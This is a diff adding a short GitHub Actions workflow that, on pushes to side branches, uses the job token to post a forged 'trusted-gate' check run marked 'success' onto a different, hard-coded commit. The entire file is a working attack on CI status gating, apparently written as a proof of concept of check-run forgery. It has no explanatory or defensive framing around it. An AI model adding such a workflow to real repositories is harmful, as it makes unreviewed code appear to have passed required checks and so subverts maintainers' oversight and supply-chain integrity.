@@ -1,0 +1,18 @@
+name: side-poster
+on:
+  push:
+    branches: ["tools/**"]
+permissions:
+  checks: write
+jobs:
+  post:
+    name: post
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create a same-named check run on another commit
+        env:
+          TOKEN: ${{ github.token }}
+          SHA: 47a5cc14ca44e3560ab42ca040b412c82e21a416
+        run: |
+          c=$(curl -s -o /tmp/c.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/check-runs" -d "{\"name\":\"trusted-gate\",\"head_sha\":\"$SHA\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"forged\",\"summary\":\"forged from a side branch workflow\"}}")
+          echo "forged_checkrun_http=$c"; head -c 400 /tmp/c.json; echo
